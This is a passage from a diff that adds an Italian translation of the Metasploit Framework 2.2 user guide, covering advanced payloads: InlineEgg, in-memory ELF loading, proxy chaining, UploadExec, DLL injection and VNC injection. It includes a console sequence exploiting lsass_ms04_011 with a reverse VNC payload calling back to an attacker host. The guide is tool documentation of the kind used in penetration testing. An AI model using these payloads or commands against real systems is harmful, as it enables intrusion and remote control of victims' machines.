+	<I>pen-testing</I>. La connessione all&rsquo;host exploitato passa
+	attraverso una porta casuale sul server web e all&rsquo;utente viene
+	dato un collegamento in protocollo telnet a questo <I>listener</I>
+	appena creato dinamicamente.</FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">L&rsquo;interfaccia
+	<I>msfweb</I> non garantisce nessun tipo di sicurezza; chiunque
+	all&rsquo;interno della rete puo&rsquo; collegarsi al server web o
+	alla porta selezionata dinamicamente. La configurazione di base
+	attiva l&rsquo;ascolto solo sulla porta di <I>loopback</I> ma puo&rsquo;
+	essere cambiato inserendo l&rsquo;opzione &ndash;a che consiste in
+	un valore <I>indirizzo:porta</I>. Esattamente come l&rsquo;interfaccia
+	a riga di comando, anche l&rsquo;ambiente salvato viene caricato
+	all&rsquo;avvio e puo&rsquo; modificare le impostazioni dei moduli.
+	Si raccomanda di NON utilizzare l&rsquo;interfaccia msfweb in
+	ambienti di produzione.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><FONT SIZE=5><B>Caratteristiche
+	avanzate</B></FONT></FONT></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	sezione presenta alcune delle caratteristiche avanzate che si
+	possono trovare in questa versione. Queste opzioni possono essere
+	usate con qualsiasi <I>exploit</I> compatibile e mettono in risalto
+	l&rsquo;efficacia di codici per attacchi sviluppati tramite il
+	Framework.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">InlineEgg
+	Python Payload</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">La
+	libreria InlineEgg &egrave; una classe <I>Python</I> per generare
+	dinamicamente piccoli programmi scritti in linguaggio Assembly.
+	L&rsquo;utilizzo piu&rsquo; diffuso di questa libreria e&rsquo; per
+	creare velocemente <I>payload</I> avanzati per <I>exploit</I>.
+	Questa libreria e&rsquo; stata sviluppata da Gera per essere usata
+	assieme con i prodotti Core ST Impact. Core ha rilasciato al
+	pubblico questa libreria sotto licenza non-commerciale.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	Metasploit Framework supporta i payload InlineEgg attraverso il
+	modulo interfaccia ExternalPayload; cio&rsquo; permette un supporto
+	trasparente se il linguaggio di <I>scripting</I> Python e&rsquo;
+	installato. Per abilitare il <I>payload</I> InlineEgg, la variabile
+	<B>EnablePython </B>deve essere impostata con valore diverso da
+	zero. Questa modifica e&rsquo; stata effettuata sulla versione 2.2
+	per velocizzare il processo di ricaricamento del modulo.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	versione include esempi di InlineEgg per Linux, BSD e Windows. Gli
+	esempi per Linux sono <I>linx86_reverse_ie, linux86_bind_ie e
+	linux86_reverse_xor</I>. Questi <I>payload</I> possono essere
+	selzionati ed utilizzati come qualsiasi altro <I>payload</I>. Il
+	contenuto del <I>payload</I> viene generato dinamicamente dagli
+	<I>script</I> in Python nella sottodirectory payloads/external. I
+	<I>payload</I> per BSD funzionano esattamente come i loro
+	equivalenti per Linux.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">L&rsquo;esempio
+	di InlineEgg per Windows e&rsquo; chiamato <I>win32_reverse_stg_ie</I>
+	e funziona in maniera leggermente diversa. Questo <I>payload</I> ha
+	uno&rsquo;opzione chiamata <B>IEGG</B>, la quale specifica il
+	percorso allo script Python InlineEgg che contiene i payload finale.
+	Si puo&rsquo; definire questo come un payload a fasi: la prima fase
+	e&rsquo; un normale collegamento di ritorno mentre la seconda fase
+	invia l&rsquo;indirizzo di GetProcAddress e LoadLibraryA attraverso
+	questo collegamento. La terza fase del payload infine e&rsquo;
+	generata localmente e inviata attraverso la rete. Un esempio
+	chiamato <I>win32_stg_winexec.py</I> di InlineEgg e&rsquo; incluso
+	nella sottodirectory payloads/external. Per maggiori informazioni
+	sull&rsquo;InlineEgg si prega di fare riferimento al sito internet
+	di Gera:</FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western"><FONT COLOR="#000080"><U><A HREF="http://community.corest.com/~gera/ProgrammingPearls/InlineEgg.html"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">http://community.corest.com/~gera/ProgrammingPearls/InlineEgg.html</FONT></SPAN></A></U></FONT></P>
+	<P CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><B>Iniezione
+	ELF &ldquo;Impurity&rdquo;</B></FONT></P>
+	<P LANG="en-US" CLASS="western">&ldquo;<SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Impurity&rdquo;
+	e&rsquo; un concetto sviluppato da Alexander Cuttergo che descrive
+	il metodo di caricamento ed esecuzione in-memoria di un nuovo
+	eseguibile ELF. Questa tecnica permette di scrivere in C dei payload
+	complessi. Il Framework include un <I>loader</I> per Linux di
+	eseguibili &ldquo;Impurity&rdquo;; il payload si chiama
+	<I>linx86_reverse_impurity</I> e richiede che l&rsquo;opzione <B>PEXEC</B>
+	sia impostata sul percorso dell&rsquo;eseguibile. Gli eseguibili
+	&ldquo;Impurity&rdquo; devono essere compilati in una determinata
+	maniera, a tal proposito fare riferimento alla documentazione
+	presente nella sottodirectory src/shellcode/linux/impurity.
+	L&rsquo;applicativo &ldquo;shelldemo&rdquo; incluso nella
+	sottodirectory dei dati permette di elencare, accedere, leggere,
+	scrivere e aprire parti di file durante il processo di exploit.
+	L&rsquo;archivio originale di tutta la corrispondenza inerente
+	all&rsquo;argomento si puo&rsquo; reperire presso:</FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western"><FONT COLOR="#000080"><U><A HREF="http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0006.html"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0006.html</FONT></SPAN></A></U></FONT></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Proxy
+	Concatenabili</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	Framework include un supporto trasparente per proxy TCP; infatti
+	questa versione contiene dei gestori di routine per server HTTP
+	CONNECT e SOCKS4. Per usare un proxy con l&rsquo;exploit desiderato,
+	bisogna impostare la variabile d&rsquo;ambiente <B>Proxies</B>. Il
+	valore della variabile sara&rsquo; una lista di server proxy
+	separati da virgole, dove ogni server e&rsquo; in formato
+	<I>tipo:host:porta</I>. Il &ldquo;tipo&rdquo; puo&rsquo; essere
+	settato come <I>http</I> per HTTP CONNECT oppure come <I>socks4</I>
+	per il SOCKS4. Si possono concatenare proxy senza alcun limite di
+	numero; il sistema si e&rsquo; infatti dimostrato stabile nonostante
+	gli oltre cinquecento SOCKS e HTTP server configurati a caso in
+	catena. Questa serie di proxy maschera la richiesta di exploit ma la
+	connessione automatica al payload non viene filtrata attraverso la
+	catena dei proxy e quindi, di fatto non e&rsquo; mascherata.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><FONT FACE="Arial, sans-serif">UploadExec
+	Payload per sistemi Win32</FONT></B></P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif">I sistemi Unix
+	normalmente includono gia&rsquo; I tool necessari per uno scenario
+	di post-exploit. Al contrario, i sistemi Windows sono di solito
+	assenti in un qualsiasi toolkit da riga di comando degno di tale
+	nome.Il payload UploadExec incluso in questa versione del Framework,
+	permette di exploitare sistemi Windows simultaneamente, caricare il
+	tool preferito ed eseguirlo, il tutto attraverso il socket di
+	collegamento del payload. Se combinato con un rootkit auto-estraente
+	o con un interprete di linguaggio (perl.exe per esempio), questo
+	payload puo&rsquo; risultare molto potente.</FONT></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><B>Iniezione
+	di Payload dentro a DLL di sistemi Win32</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">La
+	versione 2.2 del Framework include un payload a fasi capace di
+	iniettare una determinata DLL nella memoria in combinazione con
+	qualsiasi exploit per sistemi Win32. Con questo payload nessun file
+	verra&rsquo; scritto su disco; la DLL e&rsquo; caricata direttamente
+	in memoria ed e&rsquo; avviata come un nuovo <I>thread</I> nel
+	processo di exploit. Questo payload e&rsquo; stato sviluppato da
+	Jarkko Turkulainen e Matt Miller ed e&rsquo; una delle tecniche
+	post-exploit piu&rsquo; potenti mai realizzate finora. Per creare
+	una DLL che possa essere usata con questo payload basta usare
+	l&rsquo;ambiente di sviluppo preferito e costruire una DLL standard
+	per Win32. Questa DLL dovrebbe esportare una funzione chiamta Init,
+	che prende un singolo argomento, un numero intero che contiene la
+	descrizione della connessione del payload. La funzione Init diventa
+	il punto di accesso per il nuovo thread, all&rsquo;interno del
+	processo di exploit. Quando questo e&rsquo; completo, l&rsquo;Init
+	dovrebbe ritornare e permettere cosi&rsquo; alla matrice del <I>loader</I>
+	di uscire dal processo secondo la variabile d&rsquo;ambiente
+	<B>EXITFUNC</B>. Se si vogliono creare le proprie DLL per il
+	payload, e&rsquo; possibile fare riferimento alla directory
+	src/shellcode/win32/dllinject.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif"><B>Iniezione di
+	una DLL dentro un Server VNC </B></FONT>
+	</P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif">Uno dei primi
+	payload sviluppati, che utilizzano la tecnica dell&rsquo;iniezione
+	di DLL, e&rsquo; stato un server VNC personalizzato. Questo server
+	e&rsquo; stato scritto da Matt Miller, basandolo sul sorgente di
+	RealVNC. Ulteriori modifiche sono state apportate per permettere al
+	server di funzionare con servizi di rete exploitati e
+	non-interattivi. Questo payload permette l&rsquo;accesso immediato
+	al desktop del sistema remoto exploitato usando un qualsiasi exploit
+	per Win32. La DLL viene caricata nel processo remoto attraverso uno
+	qualsiasi dei sistemi di caricamento a fasi (staged loader systems),
+	viene avviata come nuovo thread nel processo di exploit e
+	successivamente viene messa in ascolto per richieste da parte di
+	client VNC sullo stesso socket usato per caricare la DLL.
+	Semplicemente il Framework resta in ascolto, su un socket locale,
+	per richieste da parte di client VNC, portando i dati nascosti
+	attraverso la connessione al server del payload.</FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	server VNC cerca di ottenere accesso completo al desktop corrente
+	interattivo. Se il primo tentativo fallisce, il server chiama
+	<I>RevertToSelf()</I> e poi riprova nuovamente. Se fallisce ancora
+	ad ottenere accesso completo al desktop, allora ripiega sulla
+	modalita&rsquo; di sola lettura. In questa modalita&rsquo;, l&rsquo;utente
+	del Framework puo&rsquo; guardare il contenuto del desktop ma non
+	puo&rsquo; interagire con esso. Se fosse stato raggiunto accesso
+	completo al desktop, il server VNC farbbe comparire una shell di
+	comando sul desktop con i privilegi del servizio exploitato. Cio&rsquo;
+	e&rsquo; molto utile in situazioni dove un utente non-privilegiato
+	ha accesso al desktop interattivo ma il servizio exploitato gira con
+	privilegi di sitema.</FONT></SPAN></P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif">Se nessun utente
+	interattivo e&rsquo; inserito nel sistema o se lo schermo e&rsquo;
+	stato bloccato, la shell di comando puo&rsquo; essere usata per
+	lanciare explorer.exe. Questo puo&rsquo; causare confusione negli
+	utenti, qualora la schermata di Logon abbia anche un proprio menu di
+	avvio. Se il desktop interattivo viene cambiato, </FONT>
+	</P>
+	<P CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif">oppure
+	se qualcuno si sta inserendo nel sistema o sta bloccando lo schermo,
+	allora il server VNC si disconnette. Le prossime versioni potrebbero
+	cercare di seguire il cambio di desktop.</FONT></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Per
+	usare  il payload di iniezione del server VNC, bisogna specificare
+	il percorso completo al server VNC e al valore dell&rsquo;opzione
+	<B>DLL</B>. Il server VNC puo&rsquo; essere trovato nella
+	sottodirectory data dell&rsquo;installazione del Framewrok. Il suo
+	nome e&rsquo; <I>vncdll.dll</I>. Il codice sorgente della DLL si
+	puo&rsquo; trovare nella sottodirectory
+	src/shellcode/win32/dllinject/vncinject, sempre nell&rsquo;installazione
+	del Framework.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>use lsass_ms04_011</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	lsass_ms04_011 &gt; <B>set RHOST some.vuln.host</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>RHOST -&gt;
+	some.vuln.host</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	lsass_ms04_011 &gt; <B>set PAYLOAD win32_reverse_vncinject</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>PAYLOAD -&gt;
+	win32_reverse_vncinject</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	lsass_ms04_011(win32_reverse_vncinject) &gt; <B>set LHOST
+	your.own.ip</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>LHOST -&gt; your.own.ip</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	lsass_ms04_011(win32_reverse_vncinject) &gt;<B> set LPORT 4321</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>LPORT -&gt; 4321</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	lsass_ms04_011(win32_reverse_vncinject) &gt; <B>exploit</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Se
+	l&rsquo;applicazione <I>vncviewer</I> e&rsquo; nel vostro percorso e
+	l&rsquo;opzione AUTOVNC e&rsquo; stata settata (default), il
+	Framework aprira&rsquo; automaticamente il desktop del VNC. Per
+	collegarsi al desktop manualmente, bisogna <B>settare AUTOVNC 0</B>
+	e poi usare <I>vncviewer</I> per collegarsi all&rsquo;indirizzo
+	127.0.0.1 porta 5900.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><FONT SIZE=5><B>Informazioni
+	aggiuntive</B></FONT></FONT></P>
+	<P LANG="en-US" CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><FONT FACE="Arial, sans-serif">Web
+	Site</FONT></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	sito web </FONT></SPAN><FONT COLOR="#000080"><U><A HREF="http://metasploit.com/"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">http://metasploit.com</FONT></SPAN></A></U></FONT><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">
+	e&rsquo; sicuramente il primo posto dove andare a guardare per
+	aggiornamenti, moduli e nuove versioni. Il sito ospita inoltre il
+	Database di Opcode nonche&rsquo; un decente archivio di shellcode
+	per Windows.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><FONT FACE="Arial, sans-serif">Mailing
+	List</FONT></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">E&rsquo;
+	possibile iscriversi alla mailing list del Metasploit Framework
+	semplicemente mandando una email vuota a
+	framework-subscribe[at]metasploit.com. Questo e&rsquo; il mezzo
+	preferito per segnalare bug, suggerire nuove caratteristiche e
+	discutere del Framework con altri utilizzatori.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Sviluppatori</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Chi
+	vuole contribuire allo sviluppo del Framework e delle prossime nuove
+	versioni puo&rsquo; contattare gli sviluppatori direttamente a
+	msfdev[at]metasploit.com</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif"><B>Traduzione</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">L&rsquo;intera
+	traduzione di questo documento esplicativo e&rsquo; stata effettuata
+	dal sottoscritto Marco Monicelli con interpretazioni a volte
+	personali della terminologia informatica usata e spesso non
+	traducibile letteralmente in italiano. Chiunque abbia bisogno di
+	informazioni o di traduzioni dall&rsquo;inglese e in inglese puo&rsquo;
+	mandarmi una email a yog[at]heap.nl oppure a
+	monnezza[at]rimasters.org. </FONT></SPAN>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+</DIV>
+<DIV TYPE=FOOTER>
+	<P LANG="en-US" ALIGN=CENTER STYLE="margin-top: 0.2in; margin-bottom: 0in">
+	<FONT COLOR="#808080"><FONT FACE="Arial, sans-serif"><FONT SIZE=2 STYLE="font-size: 11pt">Copyright
+	&copy; METASPLOIT.COM 2003, 2004</FONT></FONT></FONT></P>
+</DIV>
+</BODY>
+</HTML>
